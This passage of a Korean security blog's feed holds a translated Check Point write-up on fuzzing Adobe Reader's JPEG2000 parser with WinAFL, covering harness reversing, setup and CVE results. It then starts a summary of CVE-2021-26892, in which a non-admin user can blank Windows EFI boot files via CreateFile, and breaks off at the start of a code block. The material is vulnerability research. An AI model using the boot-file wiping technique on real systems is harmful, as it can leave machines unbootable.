      <content:encoded><![CDATA[<h1 id="번역-추신"><a href="#번역-추신" class="headerlink" title="번역 추신"></a>번역 추신</h1><p>WinAFL 연구글을 쓰면서 타겟함수 찾기 위해 분석하는 방식을 좀 더 공부하기 위해 읽은 글입니다. 참 애매한 주제인 게 타겟 분석을 너무 많이하면 퍼징을 하는 의미가 없어지고 그렇다고 분석을 너무 적게 하면 Harness 작성 및 퍼징을 돌리는 거 자체가 번거워집니다. 그 사이 어딘가 적정 선을 찾는 것이 중요한데 이 글이 도움이 될 거라 생각합니다. 이 글을 따라서 직접 실습해보고 재구성한 연구글을 업로드할 생각이었지만 종강 기념으로 놀다 와서 진득하게 연구글을 쓸 시간이 없었습니다. ㅎㅎ 그래서 일단 번역글을 올립니다. 현재 업로드 중인 WinAFL 시리즈의 다음 글은 이번 번역글을 좀 더 깊게 공부해보고 작성하겠습니다.</p><p>원본글 :  <a href="https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/">https://research.checkpoint.com/2018/50-adobe-cves-in-50-days/</a></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>2017년에 큰 변화가 있었습니다. 그 해에 보고된 새로운 취약점의 수는 약 14,000개로, 전년보다 두 배 이상 많습니다. 아마 그 이유는 자동 취약점 탐색 툴인 “퍼저”의 인기가 높아졌기 때문일 겁니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/1.png"></p><p>퍼저 자체는 20년 이상 존재해 왔고 그리 새로운 기술은 아닙니다. 하지만 주목해야 할 사실은 퍼저들이 발전했다는 겁니다. 그들은 더욱 뛰어난 기능과 쉬운 접근성을 가지게 됐으며 무엇보다 완성도가 높아졌습니다. 그럼에도 불구하고, 퍼저를 사용하는 것은 “어두운 예술”이라는 평판을 가지고 있기 때문에 많은 연구자들은 퍼저를 사용하는 것을 꺼려합니다.</p><p>위의 모든 것을 고려해 볼 때, 다음과 같은 질문을 해볼 수 있습니다. “더 많은 연구자들이 더 많은 취약점을 찾기 위해 퍼저를 사용하고 있다. 하지만 <em>모든</em> 연구자들이 <em>모든</em> 취약점을 찾기 위해 퍼저를 사용하고 있을까?” “FUZZ라고 적힌 커다란 버튼을 누르기만 하면 찾을 수 있는, 거저먹을 수 있는 취약점들이 얼마나 있을까?”</p><p>그 답을 알기 위해, 저희는 저희가 생각할 수 있는 가장 흔한 실험을 만들었습니다. 가장 일반적인 Windows 퍼징 프레임워크 중 하나인 WinAFL과 세계에서 가장 인기 있는 소프트웨어 제품 중 하나인 Adobe Reader를 사용했습니다. 저희는 코드를 분석하고, 취약점이 있을 만한 라이브러리를 찾아 harness를 작성하고, 마지막으로 퍼징 등 전체 작업에 50일의 기간을 설정했습니다.</p><p>결과는 매우 충격적이었습니다. 50일 동안 Adobe Reader에서 50개 이상의 새로운 취약점을 발견할 수 있었습니다. 이는 하루 평균 1개의 취약점으로, 이러한 유형의 연구에서는 흔하지 않은 속도입니다.</p><p>이 글을 통해 해당 연구의 전말을 알려드리려 합니다. 검색 범위를 넓히기 위해 사용한 새로운 방법론, WinAFL을 개선한 방법, 그리고 마지막으로 그 과정에서 얻은 지식을 공유하려 합니다.</p><h1 id="What-is-WinAFL"><a href="#What-is-WinAFL" class="headerlink" title="What is WinAFL?"></a>What is WinAFL?</h1><p>AFL은 coverage guided genetic fuzzer로, 실제 프로그램에서 버그를 찾는 데 매우 영리한 휴리스틱을 갖고 있습니다.</p><p>WinAFL은 Windows용 AFL로 Ivan Fratric(Google Project Zero)에 의해 만들어지고 관리되고 있습니다. Closed source 바이너리를 타겟으로 한 여러 instrumentation을 사용합니다.</p><p>우선 AFL이 어떻게 동작하는지 자세하게 적혀있는 AFL 기술 문서를 읽는 것을 추천합니다. 또한 단점을 지적하고 문제가 발생했을 때 디버깅할 수 있도록 도와줍니다.</p><p>WinAFL은 압축 바이너리 형식(이미지, 비디오, 아카이브)의 파일 포맷 버그를 찾는데 매우 효과적입니다.</p><h1 id="Attacking-Acrobat-Reader-DC"><a href="#Attacking-Acrobat-Reader-DC" class="headerlink" title="Attacking Acrobat Reader DC"></a>Attacking Acrobat Reader DC</h1><p>우선 메인 바이너리 AcroRd32.exe부터 시작해 봅시다.  AcroRD32.dll 주변의 (상대적으로) 얇은 wrapper이며 대략 30MB입니다. AcroRD32.dll은 많은 코드가 있습니다. 그중 일부는 PDF 오브젝트에 대한 파서가 포함되어 있고 대부분은 GUI 코드(일반적으로 GUI 코드에선 버그를 찾지 않음)입니다.</p><p>WinAFL은 바이너리 포맷에 효과적이므로 특정 파서를 공격하는데 집중하기로 했습니다. 문제는 파서를 찾아서 파서를 위한 harness를 작성하는 것입니다. Harness란 정확히 무엇인지 잠시 후에 설명하겠습니다.</p><p>전체 Reader 프로세스를 로드하지 않고도 로드할 수 있는 바이너리 포맷의 파서를 찾아야 합니다.</p><p>Acrobat의 폴더에서 DLL을 탐색한 결과 JP2KLib.dll이 이상적인 타겟임을 확인했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/2.png"></p><p>JP2KLib.dll은 JPEG2000 포맷의 파서로 상당히 유용한 함수를 export 합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/3.png"></p><p>이번 연구의 타겟은 다음과 같습니다.</p><p>Acrobat Reader DC ≤ 2018.011.238</p><p>JP2KLib.dll 1.2.2.39492</p><h1 id="What-is-a-Target-Function"><a href="#What-is-a-Target-Function" class="headerlink" title="What is a Target Function?"></a>What is a Target Function?</h1><p><a href="https://github.com/googleprojectzero/winafl#how-to-select-a-target-function">타겟함수</a>는 WinAFL이 퍼징 프로세스의 엔트리 포인트로 사용된는 함수를 뜻합니다. fuzz_iteration 횟수만큼 반복 호출되며 각 실행마다 input 파일을 뮤테이트합니다.</p><p>타겟 함수는:</p><p>input 파일을 열고, 파일을 읽고, 파일을 파싱 한 후 닫아야 합니다.</p><p>C++ exception 혹은 TermainateProcess를 호출하지 않고 정상적으로 리턴해야 합니다.</p><p>이런 함수를 찾기란 쉽지 않고 따라서 복잡한 소프트웨어가 타겟일 땐 대개 harness를 작성해야 합니다.</p><h1 id="What-is-a-Harness"><a href="#What-is-a-Harness" class="headerlink" title="What is a Harness?"></a>What is a Harness?</h1><p>Harness는 퍼징 하려는 함수를 트리거하는 작은 프로그램입니다. Harness는 타겟 함수를 포함하고 있어야 합니다. 다음은 WinAFL 레포에 포함된 gdiplus에 대한 간단한 예제 harness입니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/4.png"></p><p>main의 첫 argument는 경로입니다. 함수 내에서 퍼징 하려는 API인 Image::Image parser를 다음과 같이 호출합니다. 오류 발생 시 프로세스를 종료하지 않고 마지막에 모든 리소스를 해제합니다.</p><p>이 프로세스는 문서화된 API에서 비교적 쉽습니다. 문서를 사용해 샘플 코드를 복사하거나 간단한 프로그램을 작성할 수 있습니다. 하지만 그러면 너무 쉽죠?</p><p>Closed Source 바이너리인 Adobe Reader를 타겟으로 선택했습니다. 이런 타겟의 Harness 작성법은 다음과 같습니다.</p><ol><li>퍼징 할만한 함수를 찾습니다.</li><li>리버싱을 통해 분석합니다.</li><li>해당 API를 호출하는 프로그램을 작성합니다.</li><li>잘 작동하는 Harness를 만들 때까지 반복합니다.</li></ol><p>다음 섹션에서는 JP2KLib.dll을 리버싱 하고 작동하는 하니스를 작성하는 방법을 자세히 설명합니다. 간략한 방법론에만 관심이 있는 독자들은 다음 섹션으로 건너뛰시길 바랍니다.</p><h1 id="Writing-a-Harness-for-JP2KLib-dll"><a href="#Writing-a-Harness-for-JP2KLib-dll" class="headerlink" title="Writing a Harness for JP2KLib.dll"></a>Writing a Harness for JP2KLib.dll</h1><p>JP2KLib.dll의 리버싱을 시작하기 전에, 먼저 해당 라이브러리가 오픈소스인지 혹은 public 심볼을 갖는지 확인해야합니다. 많은 시간을 절약할 수 있고 생각보다 흔한 일이지만 저희의 경우에는 운이 별로 좋지 않았습니다.</p><p>저희는 Adobe Reader가 JP2KLib를 사용하는 방식과 최대한 유사한 Harness를 작성하고 싶기 때문에 먼저 적절한 PDF파일을 찾아야 했습니다.</p><p>저희는 제품 테스트용 PDF corpus를 많이 가지고 있습니다. 그중 JPEG2000용 PDF 필터인 “/JPXdecode”에 해당하는 가장 간단한 예제를 사용했습니다. 구글링 또는 Abrocat Pro/Phantom PDF를 사용해 testcase를 생성할 수도 있습니다.</p><p>Pro Tip 1: reader에 샌드박스가 있어 debugging/triaging에 성가신 경우가 있으므로 이 기능을 사용하지 않도록 설절할 수 있습니다.</p><p><a href="https://forums.adobe.com/thread/2110951">https://forums.adobe.com/thread/2110951</a></p><p>Pro Tip 2: <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap">PageHeap</a>을 설정하여 할당 위치와 크기를 추적하는 것으로 리버싱 작업을 수월하게 만들 수 있습니다.</p><p>PDF wrapper 없이도 harness에 사용할 수 있도록 샘플 중에서 추출하여 jp2 파일을 추출했습니다. 나중에 harness의 test input으로 사용할 것들입니다.</p><p>작동하는 최소 샘플을 얻었으니 “sxe ld jp2klib”을 사용해 JP2KLib.dll이 로드되는 시점에 브레이크 포인트를 걸어줍니다. 브레이크 포인트가 걸리면 JP2KLib의 모든 export 함수에 브레이크 포인트를 걸어 줍니다. 브레이크 포인트 명령어는 모든 call stack, 인자, 리턴 값을 기록합니다.</p><pre><code class="hljs bash">bm /a jp2klib!* “.<span class="hljs-built_in">echo</span> callstack; k L5; .<span class="hljs-built_in">echo</span> parameters:;  dc esp L8;  .<span class="hljs-built_in">echo</span> <span class="hljs-built_in">return</span> value: ; pt; ”</code></pre><p>샘플 PDF를 로드해 다음과 같은 output을 얻었습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/5.png"></p><p>JP2KLib가 로드된 후 첫 번째로 호출되는 함수는 JP2KLibInitEx입니다. JP2KLibInitEx가 받는 인자를 분석해 봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/6.png"></p><p>AcrobRd32.dll의 함수를 가리키는 포인트가 담긴 0x20 크기의 구조체를 인자로 받습니다. 새로운 함수에 도달했다고 바로 분석하려들면 안됩니다. 그 함수가 타겟 코드에서 쓰일지 모르기 때문입니다. 우선 “nopX”(X는 숫자)라는 이름으로 빈 함수 포인터를 구조체에 넣어놓고 Harness의 뼈대를 만들어 봅시다.</p><ol><li>Command line argument로부터 input file을 받는다.</li><li>JP2KLib.dll을 로드한다.</li><li>만들어둔 구조체를 인자로 JP2KLibInitEx를 호출합니다.</li></ol><p><img src="/2021/07/04/fabu1ous/50cve/7.png"></p><p>LOAD_FUNC는 저희가 작성한 매크로입니다. nopX 함수를 설정하는 NOP매크로도 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/8.png"></p><p>컴파일하고 sample.jp2와 함께 실행해보면 잘 작동합니다.</p><p>“g”명령어를 통해 다음 함수로 넘어가 봅시다. 다음으로 실행되는 함수는 JP2KGetMemObjEx이고 어떠한 인자도 받지 않습니다. 따라서 호출하고 리턴 값만 저장합시다.</p><p>그다음 함수인 JP2KDecOptCreat 또한 인자를 받지 않습니다. 마찬가지로 호출하고 리턴 값만 저장합니다. 여기서 문제가 발생합니다. JP2KDecOptCreat 내부에서 nop4와 nop7 함수를 호출하는군요. 따라서 각각 구현을 해줘야 합니다.</p><p>이제 nop4가 어떤 동작을 하는지 알아내야 합니다. nop4에 해당하는 실제 함수 AcroRd32!CTJPEGDecoderRelease+0xa992 에 브레이크 포인트를 걸어줍니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/9.png"></p><p>그리고 계속 실행하다보면</p><p><img src="/2021/07/04/fabu1ous/50cve/10.png"></p><p>이곳에 도달합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/11.png"></p><p>즉, nop4는 malloc의 wrapper함수입니다. 저희가 직접 구현한 뒤 nop4와 바꿔줍니다. nop7(memset), nop5(free), nop6(memcpy)에 대해서도 동일한 작업을 해줍니다.</p><p>그다음 함수인 JP2KDecOptInitToDefaults 인자를 받지 않습니다. 호출하고 리턴 값을 저장합니다.</p><p>현재 harness의 모습은 다음과 같습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/12.png"></p><p>다음 함수인 JP2KImageInitDecoderEx는 5개의 인자를 받습니다!</p><p>5개의 인자 중 3개는 JP2KImageCreate, JP2KDecOptCreate, JP2KGetMemObjEx의 리턴 값입니다.</p><p>세 번째 인자는 vtable을 가리키는 포인터입니다. 지금까지 사용한 트릭을 똑같이 반복합니다. nop을 담고 있는 구조체를 인자로 함수를 호출합니다.</p><p>두 번째 인자는 구조체입니다. 함수 포인터를 담고 있지 않기 때문에 상수값 0xbaaddaab를 보내줍니다.</p><p>현재 harness의 모습은 다음과 같습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/13.png"></p><p>harness를 실행해보니 nop10으로 도달했습니다. nop10의 실제 함수에 브레이크 포인트를 걸면 다음과 같은 call stack을 얻을 수 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/14.png"></p><p>JP2KCodeStm::IsSeekable를 IDA로 살펴봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/15.png"></p><p>JP2KCodeStm의 0x24 오프셋에 이전 단계에 넣어준 vtable이, 0x18 오프셋에 0xbaaddaab 상수값이 있는 것을 Windbg로 확인할 수 있습니다. JP2KCodeStm::IsSeekable은 0xbaaddaab를 인자로 vtable에 있는 함수를 호출합니다.</p><p>각 파서마다 다르겠지만 일반적으로 익숙한 파일 인터페이스(FILE/ifstream)에 존재하는 input stream을 사용합니다. 일종의 input stream(network/file/memory) 추상화입니다. 저희는 JP2KCodeStm의 동작을 보고 바로 알아차렸습니다.</p><p>0xbaaddaab는 스트림 오브젝트이고 vtable은 그 스트림 오브젝트에 대한 함수들입니다. IDA로 돌아가 JP2KCodeStm::XXX 함수들을 확인해 봅시다.</p><p><img src="/2021/07/04/fabu1ous/50cve/16.png"></p><p>대부분 유사한 방식을 사용하기 때문에 직접 파일 오브젝트를 만들고 필요한 메소드를 구현해봤습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/17.png"></p><p>오류가 나면 버리고 아니라면 JP2KImageInitDecoderEx의 리턴 값을 검사하도록 만들었습니다. JP2KImageInitDecoderEx은 성공 시 0을 리턴합니다. 스트림 함수를 구현하는데 몇 번의 시행착오가 있었지만 원하던 리턴 값을 얻는 데 성공했습니다.</p><p>다음 함수인 JP2KImageDataCreate는 인자를 받지 않으며 리턴 값을 그다음 함수인 JP2KImageGetMaxRes에 전달합니다. 호출하고 넘어갑니다.</p><p>다음은 7개의 인자를 받는 JP2KImageDecodeTileInterleaved 함수입니다. 7개의 인자 중 3개는 JP2KImageCreate, JP2KImageGetMaxRes, JP2KImageDataCreate의 리턴 값입니다.</p><p>IDA로 확인해본 결과 두 번째 그리고 6번째 인자는 NULL입니다.</p><p>네 번째, 다섯 번째 인자는 color depth와 관련된 인자로 저희는 이 두 값이 고정된 체로 퍼징을 하기로 결정했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/18.png"></p><p>최종적으로 JP2KImageDataDestroy, JP2KImageDestroy, JP2KDecOptDestroy 함수들을 호출해 저희가 만든 오프젝트들을 해제해 memory leak을 방지합니다. 이 작업은 WinAFL로 fuzz_iterations가 높은 작업을 할 때 중요합니다.</p><p>자 이제 잘 작동하는 Harness를 완성했습니다!</p><p>아주 사소한 수정을 해줍니다. JP2KLib을 로드하고 필요한 함수를 받아오는 초기화 작업을 분리합니다. 매 실행마다 초기화 작업을 다시 해 줄 필요가 없으니 이를 분리해줌으로써 실행 속도를 향상할 수 있습니다. 새로운 함수에 fuzzme라는 이름을 지어주고 export 해줍니다. 유효한 오프셋을 구하는 것보다 export 하는 것이 훨씬 쉽습니다.</p><h1 id="Fuzzing-Methodology"><a href="#Fuzzing-Methodology" class="headerlink" title="Fuzzing Methodology"></a>Fuzzing Methodology</h1><ol><li>Basic tests for the harness<ol><li>Stability</li><li>Paths</li><li>Timeouts</li></ol></li><li>Fuzzing Setup</li><li>Initial corpus</li><li>Initial line coverage</li><li>Fuzzing loop<ol><li>Fuzz</li><li>Check coverage / crashes</li><li>cmin &amp; repeat</li></ol></li><li>Triage</li></ol><h1 id="Basic-Tests-for-the-Harness"><a href="#Basic-Tests-for-the-Harness" class="headerlink" title="Basic Tests for the Harness"></a>Basic Tests for the Harness</h1><p>퍼징을 시작하기 앞서 몇 가지 sanity test를 해야 합니다. 그저 서버실 온도만 높이는 일이 발생할 수 있으니. 첫 번째로 확인해야 할 것은 퍼저가 새로운 실행 path에 도달하는가입니다. 즉, total path count가 꾸준히 상승하는지 확인해야 합니다.</p><p>만약 path count가 0이거나 거의 0이라면 다음과 같은 함정들을 조사해봐야 합니다.</p><ul><li>컴파일러에 의해 타겟함수가 인라인 처리되어 WinAFL이 도달하지 못한다.</li><li>인자 개수나 함수 호출 규약이 잘못됐다.</li><li>타임아웃이 너무 낮아 harness가 너무 일찍 종료된다.</li></ul><p>퍼저를 몇 분 정도 실행한 뒤 안정성을 확인했습니다. 안정성이 낮아(80% 미만) 이슈를 디버깅해봤습니다. Harness의 안정성은 퍼저의 성능과 직결되기 때문에 매우 중요합니다.</p><p>흔히 빠지는 함정들</p><ul><li>난수 element들을 확인해봐야 합니다. 예를 들어 몇몇 hash table들은 collision을 방지하기 위해 난수를 사용합니다. 이는 coverage의 정확도를 떨어뜨리는 작업이므로 난수의 seed를 상수값으로 고정시키는 패치를 해줍니다.</li><li>몇몇 소프트웨어는 특정 global object에 대한 cach를 사용합니다. nop run을 통해 이를 방지합니다.</li><li>Windows 10 64-bit 시스템에서 돌아가는 32-bit 타겟의 stack alignment는 항상 8이 아닙니다. 이는 memcpy를 포함한 다른 AVX 최적화 코드들의 동작에 영향을 주며 coverage 또한 영향을 받습니다. harness에 stack aligne을 맞추는 코드를 추가하는 방법으로 해결할 수 있습니다.</li></ul><p>만약 위 방법이 모두 실패한다면 DynamoRIO를 사용해 harness의 인스트럭션을 추적하고 output을 비교합니다.</p><h1 id="Fuzzing-Setup"><a href="#Fuzzing-Setup" class="headerlink" title="Fuzzing Setup"></a>Fuzzing Setup</h1><p>저희는 다음 과 같은 VM을 사용합니다.</p><p>8~16 core, 32 GB of RAM, Windows 10 x64</p><p>저희는 <a href="https://sourceforge.net/projects/imdisk-toolkit/">ImDisk toolkit</a>을 사용해 RAM disk drive를 사용합니다. 빠른 타겟을 대상으로 디스크에 test case를 작성하는 것은 병목 현상을 유발하기 때문입니다.</p><p>Windows Defender 또한 성능에 악영향을 끼치니 비활성화해줍니다. WinAFL이 생성하는 test case들 중 Windows Defender에서 알려진 exploit으로 처리하는 경우도 있습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/19.png"></p><p>Windows Indexing Service도 비활성화해줍니다.</p><p>퍼징 도중 시스템을 재시작하거나 퍼징 하던 dll을 대체하는 등의 문제가 발생할 수 있으니 Windows Update도 비활성화해줍니다.</p><p>버그 탐색에 도움이 되므로 harness 프로세스에 대한 page heap은 활성화해줍니다.</p><p>속도는 느리지만 버그 탐색에 효과적이라는 edge coverage type을 사용했습니다.</p><p>퍼징을 시작하는 명령어는 다음과 같습니다.</p><pre><code class="hljs bash">afl-fuzz.exe -i R:\\jp2k\\<span class="hljs-keyword">in</span> -o R:\\jp2k\\out -t 20000+ -D c:\\DynamoRIO-Windows-7.0.0-RC1\\bin32 -S Slav02 — -fuzz_iterations 10000 -coverage_module JP2KLib.dll -target_module adobe_jp2k.exe -target_method fuzzme -nargs 1 -covtype edge — adobe_jp2k.exe @@</code></pre><h1 id="Initial-Corpus"><a href="#Initial-Corpus" class="headerlink" title="Initial Corpus"></a>Initial Corpus</h1><p>Harness를 완성했다면 아래 방법들로 초기 corpus를 확보해야 합니다.</p><ul><li>Online corpuses ( <a href="https://lcamtuf.coredump.cx/afl/demo/">afl corpus</a>, <a href="https://github.com/uclouvain/openjpeg-data">openjpeg-data</a> )</li><li>Test suites from open source projects</li><li>Crawlling google / duckduckgo</li><li>Corpuses from our older fuzzing projects</li></ul><h1 id="Corpus-Minimization"><a href="#Corpus-Minimization" class="headerlink" title="Corpus Minimization"></a>Corpus Minimization</h1><p>동일한 coverage를 생성하는 용량이 큰 파일을 사용하면 퍼저의 성능이 저하됩니다. AFL은 이를 해결하기 위해 afl-cmin을 사용해 corpus를 간소화 시킵니다. WinAFL은 winafl-cmin.py라는 툴을 제공합니다.</p><p>확보한 모든 파일을 winafl-cmin.py에 넣고 간소화된 corpus를 얻을 수 있습니다.</p><p>같은 파일에 대해 winafl-cmin을 두 번 돌려보고 같은 결과가 나오는지 비교해봐야 합니다. 만약 두 결과가 다르다면 harness가 비결정론 문제를 안고 있다고 볼 수 있습니다.</p><h1 id="Initial-Line-Coverage"><a href="#Initial-Line-Coverage" class="headerlink" title="Initial Line Coverage"></a>Initial Line Coverage</h1><p>Corpus를 얻었으니 이젠 line coverage를 살펴볼 차례입니다. Line coverage란 실제로 실행된 어셈블리 인스트럭션을 뜻합니다. DynamoRIO를 사용해 line coverage를 얻을 수 있습니다.</p><pre><code class="hljs bash">[dynamoriodir]\\bin32\\drrun.exe -t drcov — harness.exe testcase</code></pre><p>각 test case에 대해 위 명령어를 실행하고 결과값을 IDA <a href="https://github.com/gaasedelen/lighthouse">Lighthouse</a>로 확인합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/20.png">는데 도움이 됩니다.</p><h1 id="Fuzzing-Cycle"><a href="#Fuzzing-Cycle" class="headerlink" title="Fuzzing Cycle"></a>Fuzzing Cycle</h1><p>다음 단계는 매우 간단합니다.</p><ol><li>퍼저를 실행한다.</li><li>Coverage와 Crash 분석</li><li>Coverage 조사, cmin 그리고 반복</li></ol><p>퍼저를 돌리는 것은 특별히 어려운 일이 아닙니다. 위에서 설명한 구성대로 퍼저를 실행하기만 하면 됩니다.</p><p>저희는 다음과 같은 기능의 봇을 사용합니다.</p><ol><li>모든 퍼저의 상태(<a href="http://winafl-whatsapp.py/">winafl-whatsapp.py</a>)</li><li>각 퍼저의 시간에 따른 path 변화 그래프</li><li>Crash triage (다음 섹션에서 다룸)</li><li>멈춘 퍼저 재시작</li></ol><p>위 작업들을 자동화하는 것이 얼마나 중요한지 굳이 설명할 필요는 없겠죠? 퍼징은 지루하고 오류가 넘치는 작업입니다.</p><p>퍼저의 상태와 path를 몇 시간 주기로 확인하고 그래프에 상승세가 보인다면 coverage를 조사합니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/21.png"></p><p>모든 퍼저의 모든 queue를 모아 cmin을 거치고 그 결과를 IDA로 확인합니다. 상대적으로 coverage가 작으면서 크기가 큰 함수를 찾습니다. 각 함수의 기능을 이해하려 노력하고 각 샘플이 어떤 기능을 트리거하는지 확인합니다.</p><p>이번 단계는 매우 중요합니다. 하나의 샘플을 추가하고 몇 시간의 퍼징을 통해 새로운 취약점 3개를 찾았습니다.</p><p>Coverage가 더 이상 늘어나지 않을 때까지 이 사이클을 반복했습니다. Coverage가 늘어나지 않는다는 뜻은 타겟을 변경하거나 harness를 개선해야 한다는 뜻입니다.</p><h1 id="Triage"><a href="#Triage" class="headerlink" title="Triage"></a>Triage</h1><p>Crash를 발생시키는 test case를 얻으면 직접 crash와 그 입력값을 분석했습니다. 하지만 중복된 결과가 많아 빠르게 전략을 바꿨습니다. <a href="https://github.com/SkyLined/BugId">Bugld</a>를 사용해 중복된 결과를 생략하고 unique crash에 대한 minimize 작업을 자동화했습니다.</p><p><img src="/2021/07/04/fabu1ous/50cve/22.png"></p><h1 id="What-We-Found"><a href="#What-We-Found" class="headerlink" title="What We Found"></a>What We Found</h1><p>이런 전략을 통해 Adobe Reader와 Adobe Pro에서 53개의 critical 한 버그를 발견할 수 있었습니다.</p><p>저희는 다른 이미지 파서 스트림 디코더 등에 이러한 프로세스를 적용해봤고 아래와 같은 CVE들을 얻을 수 있었습니다.</p><p>CVE-2018-4985, CVE-2018-5063, CVE-2018-5064, CVE-2018-5065, CVE-2018-5068, CVE-2018-5069, CVE-2018-5070, CVE-2018-12754, CVE-2018-12755, CVE-2018-12764, CVE-2018-12765, CVE-2018-12766, CVE-2018-12767, CVE-2018-12768, CVE-2018-12848, CVE-2018-12849, CVE-2018-12850, CVE-2018-12840, CVE-2018-15956, CVE-2018-15955, CVE-2018-15954,CVE-2018-15953, CVE-2018-15952, CVE-2018-15938, CVE-2018-15937, CVE-2018-15936, CVE-2018-15935, CVE-2018-15934, CVE-2018-15933, CVE-2018-15932 , CVE-2018-15931, CVE-2018-15930 , CVE-2018-15929, CVE-2018-15928, CVE-2018-15927, CVE-2018-12875, CVE-2018-12874 , CVE-2018-12873, CVE-2018-12872,CVE-2018-12871, CVE-2018-12870, CVE-2018-12869, CVE-2018-12867 , CVE-2018-12866, CVE-2018-12865 , CVE-2018-12864 , CVE-2018-12863, CVE-2018-12862, CVE-2018-12861, CVE-2018-12860, CVE-2018-12859, CVE-2018-12857, CVE-2018-12839, CVE-2018-8464</p><p>jp2k에서 발견한 취약점 중 하나는 <a href="https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/">실제 공격</a>에 악용되고 있는 것으로 확인되어 발견하고 얼마 지나지 않아 Adobe에 제보했습니다.</p><p>물론 Adobe Reader의 샌드박스와 Reader Protected Mode는 exploit의 복잡도를 크게 증가시켰습니다. 위에서 언급한 공격 사례처럼 샌드 박스로부터 시스템에 영향을 미치기 위해선 또 다른 PE exploit을 요구합니다.</p><p>저희는 WinAFL을 사랑하고 더 많이 쓰이길 바라고 있습니다.</p><p>WinAFL을 사용하면서 버그나 기능 누락 등을 자주 마주쳤습니다. Windows 10 Appifier에 대한 지원 추가, CPU 선호도, 버그 수정 및 몇 가지 GUI 기능을 추가하고 업스트림 했습니다.</p><p>저희 커밋 링크입니다.</p><p>Netanel’s commits – <a href="https://github.com/googleprojectzero/winafl/commits?author=netanel01">https://github.com/googleprojectzero/winafl/commits?author=netanel01</a></p><p>Yoava’s commits – <a href="https://github.com/googleprojectzero/winafl/commits?author=yoava333">https://github.com/googleprojectzero/winafl/commits?author=yoava333</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/04/fabu1ous/50cve/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-26892: AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</title>
      <link>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/</link>
      <guid>https://hackyboiz.github.io/2021/07/03/fabu1ous/2021-07-02/</guid>
      <pubDate>Sat, 03 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/30/cve-2021-26892-an-authorization-bypass-on-the-microsoft-windows-efi-system-partition">AN AUTHORIZATION BYPASS ON THE MICROSOFT WINDOWS EFI SYSTEM PARTITION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Extensible Firmware Interface</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Extensible Firmware Interface의 보안 기능을 우회하는 방법이 발견됐습니다. UEFI는 BIOS를 대체하는 펌웨어 규격으로 부팅 시 프로세서가 실행하는 첫 인스트럭션을 담고 있습니다. UEFI는 EFI System Partiton(이하 ESP)를 포함한 boot device를 탐색하는 작업을 합니다. ESP는 FAT 파일 시스템 포맷을 따르며 OS를 실행하기 위해 펌웨어가 파싱하는 <code>.EFI</code>파일(부트로더라고도 불림)을 담고 있습니다. FAT 파일 시스템은 ACL이나 보안 정책을 파일에 기록하지 않기 때문에 Windows에 마운트 되면 누구나 그 안에 있는 모든 파일에 읽기 또는 쓰기 작업을 할 수 있습니다. 부팅에 필요한 critical 파일을 누구나 접근할 수 있다면 악성코드를 담은 bootkit으로 대체되는 등의 문제가 발생할 수 있습니다. 따라서 Windows는 부팅이 완료된 이후에 ESP가 마운트 되는 것을 제한하고, 만약 마운트 됐다 하더라도 관리자 권한이 없다면 해당 볼륨에 어떠한 작업도 허용하지 않습니다.</p><p>하지만 <code>CreateFile</code> API와 ESP 볼륨 이름을 포함한 절대 경로를 통해 관리자 권한 없이 ESP 내부에 존재하는 임의의 <code>.EFI</code> 파일 핸들을 얻어 해당 파일의 내용을 백지화할 수 있습니다. 이미 존재하는 파일에 대해 <code>dwDesiredAccess</code> 값이 없고 <code>dwCreateDisposition</code> 에 <code>CREATE_ALWAYS</code>  플래그를 사용한 <code>CreateFile</code> 요청은 대상 파일의 크기를 0으로 축소합니다. 이를 악용해 관리자 권한이 없는 사용자라도 critical한 <code>.EFI</code> 파일의 내용을 지워버릴 수 있고 해당 시스템이 부팅하지 못하도록 만들 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function">HANDLE <span 